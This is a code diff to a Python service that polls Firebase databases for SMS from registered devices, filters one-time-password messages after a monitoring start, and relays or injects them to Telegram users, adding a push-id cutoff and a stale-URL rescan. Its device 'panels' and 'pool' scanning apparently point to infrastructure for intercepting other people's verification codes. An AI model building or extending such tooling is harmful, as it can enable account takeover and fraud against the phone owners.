@@ -102,7 +102,8 @@ TIME_FIELDS = (
     "receivedDate",
     "createdDate",
 )
-RECENT_MESSAGES_LIMIT = 40
+RECENT_MESSAGES_LIMIT = 55
+FIREBASE_URL_REVALIDATE_EVERY = 250
 MAX_OTP_DELIVER_PER_POLL = 40
 _MESSAGES_DEVICE_PATH_RE = re.compile(r"^messages/[^/]+$")
 SEEN_META_KEY = "firebase_sms_seen"
@@ -113,6 +114,7 @@ BASELINE_READY_META_KEY = "firebase_sms_baseline_ready"
 BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY = "firebase_sms_baseline_shallow_done"
 BASELINE_POLL_TAIL_LOCK_META_KEY = "firebase_sms_baseline_poll_lock"
 MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
+BASELINE_PUSH_CUTOFF_META_KEY = "firebase_baseline_push_cutoff"
 SMS_FIREBASE_URL_META_KEY = "firebase_sms_poll_url"
 POOL_SMS_SCAN_DONE_META_KEY = "firebase_pool_sms_scan_done"
 OTP_EMPTY_POLL_STREAK_META_KEY = "otp_empty_poll_streak"
@@ -366,6 +368,7 @@ def preserve_sms_monitor_meta_in_device_json(
             or key.startswith("firebase_messages_")
             or key.startswith("firebase_pool_")
             or key.startswith("otp_")
+            or key.startswith("firebase_baseline_")
             or key in {SMS_FIREBASE_URL_META_KEY, SMS_PATHS_META_KEY}
         ):
             merged[key] = value
@@ -464,6 +467,7 @@ def clear_sms_baseline(device: Device) -> None:
     meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
     meta.pop(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY, None)
     meta.pop(BASELINE_POLL_TAIL_LOCK_META_KEY, None)
+    meta.pop(BASELINE_PUSH_CUTOFF_META_KEY, None)
     _save_meta(device, meta)
 
 
@@ -575,6 +579,18 @@ def _messages_high_water(device: Device) -> int:
         return 0
 
 
+def _baseline_push_cutoff(device: Device) -> int:
+    """Push-id at /startmonitor — never raised on delivery (old skip stays stable)."""
+    meta = _meta_dict(device)
+    raw = meta.get(BASELINE_PUSH_CUTOFF_META_KEY)
+    if raw is not None:
+        try:
+            return int(raw or 0)
+        except (TypeError, ValueError):
+            pass
+    return _messages_high_water(device)
+
+
 def _is_new_after_high_water(record: dict[str, Any], device: Device) -> bool:
     push_id = _message_push_id(record)
     if push_id is None:
@@ -598,6 +614,7 @@ def _set_baseline_high_water(
 ) -> None:
     meta = _meta_dict(device)
     meta[MESSAGES_HIGH_WATER_META] = int(high_water)
+    meta[BASELINE_PUSH_CUTOFF_META_KEY] = int(high_water)
     meta[BASELINE_META_KEY] = []
     if started_at:
         meta[BASELINE_AT_META_KEY] = _started_iso(started_at)
@@ -618,16 +635,22 @@ def _should_deliver_otp_record(
     device: Device,
     profile: MonitorProfile,
 ) -> bool:
-    """Only SMS after /startmonitor — push_id strictly above baseline high_water."""
+    """New SMS after monitor start; frozen push cutoff + seen (lastSms/webhook friendly)."""
     if not _monitoring_baseline_done(device, profile):
         return False
     if _record_dedup_key(record) in get_seen_sms_keys(device):
         return False
     push_id = _message_push_id(record)
-    high_water = _messages_high_water(device)
-    if push_id is not None and high_water > 0:
-        return push_id > high_water
-    return _record_is_after_monitoring_start(record, profile)
+    cutoff = _baseline_push_cutoff(device)
+    if push_id is not None and cutoff > 0 and push_id <= cutoff:
+        return False
+    if push_id is not None:
+        return True
+    if _record_is_after_monitoring_start(record, profile):
+        return True
+    sender = str(record.get("sender") or "")
+    body = str(record.get("message") or "")
+    return _looks_like_incoming_sms(sender, body)
 
 
 def _looks_like_incoming_sms(sender: str, body: str) -> bool:
@@ -1448,11 +1471,43 @@ def mark_monitoring_baseline_started(device: Device, profile: MonitorProfile, db
     meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
     meta.pop(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY, None)
     meta.pop(BASELINE_POLL_TAIL_LOCK_META_KEY, None)
+    meta.pop(BASELINE_PUSH_CUTOFF_META_KEY, None)
     if profile.started_at:
         meta[BASELINE_AT_META_KEY] = _started_iso(profile.started_at)
     _save_meta(device, meta)
     if db is not None:
         db.commit()
+
+
+async def _maybe_revalidate_firebase_poll_url(
+    profile: MonitorProfile,
+    device: Device,
+    db,
+    firebase_url: str,
+) -> str:
+    """Some devices move panel — recheck cached SMS DB without blocking every poll."""
+    cycle = _poll_cycle.get(device.id, 0)
+    if cycle % FIREBASE_URL_REVALIDATE_EVERY != 0:
+        return firebase_url
+    device_id = (device.name or "").strip()
+    if not device_id:
+        return firebase_url
+    timeout = _otp_poll_timeout()
+    if await _messages_path_exists(firebase_url, device_id, timeout=timeout):
+        return firebase_url
+    meta = _meta_dict(device)
+    meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+    _save_meta(device, meta)
+    db.commit()
+    logger.warning("OTP poll URL stale device=%s was=%s", device_id, firebase_url)
+    new_url = await resolve_firebase_url_for_otp_poll(
+        profile,
+        device,
+        db,
+        force_pool_scan=True,
+    )
+    return new_url or firebase_url
 
 
 async def run_baseline_snapshot_background(telegram_user_id: int) -> None:
@@ -1668,15 +1723,11 @@ async def _poll_messages_otp_only(
         logger.warning("OTP poll empty device=%s url=%s", device_id, firebase_url)
 
     candidates: list[dict[str, Any]] = []
-    poll_high_water = _messages_high_water(device)
+    poll_cutoff = _baseline_push_cutoff(device)
     for record in records:
         if not _should_deliver_otp_record(record, device, profile):
             push_id = _message_push_id(record)
-            if (
-                push_id is not None
-                and poll_high_water > 0
-                and push_id <= poll_high_water
-            ):
+            if push_id is not None and poll_cutoff > 0 and push_id <= poll_cutoff:
                 mark_sms_keys_seen(device, {_record_dedup_key(record)})
             continue
         sender = str(record.get("sender") or "Unknown")
@@ -1743,6 +1794,23 @@ async def _poll_messages_otp_only(
                 push_id,
                 inject_ok,
             )
+            if inject_ok:
+                save_sms(
+                    db,
+                    sender=sender,
+                    message=body,
+                    device_name=device.name,
+                    received_at=record.get("received_at"),
+                )
+                mark_sms_keys_seen(device, {dedup})
+                delivered += 1
+                db.commit()
+                logger.warning(
+                    "OTP inject-only (DM failed) user=%s sender=%s push_id=%s",
+                    profile.telegram_user_id,
+                    sender,
+                    push_id,
+                )
             continue
 
         save_sms(
@@ -1754,8 +1822,6 @@ async def _poll_messages_otp_only(
         )
         mark_sms_keys_seen(device, {dedup})
         mark_inject_done_keys(device, {dedup})
-        if push_id is not None:
-            _bump_messages_high_water(device, push_id)
         delivered += 1
         db.commit()
         logger.info(
@@ -1783,10 +1849,19 @@ async def _poll_one_monitoring_profile(profile_id: int) -> int:
         if not device:
             return 0
 
+        _poll_cycle[device.id] = _poll_cycle.get(device.id, 0) + 1
+
         firebase_url = await resolve_firebase_url_for_otp_poll(profile, device, db)
         if not firebase_url:
             logger.warning("OTP poll skip user=%s: no firebase URL", profile.telegram_user_id)
             return 0
+
+        firebase_url = await _maybe_revalidate_firebase_poll_url(
+            profile,
+            device,
+            db,
+            firebase_url,
+        )
 
         return await _poll_messages_otp_only(profile, device, firebase_url, db)
     finally:
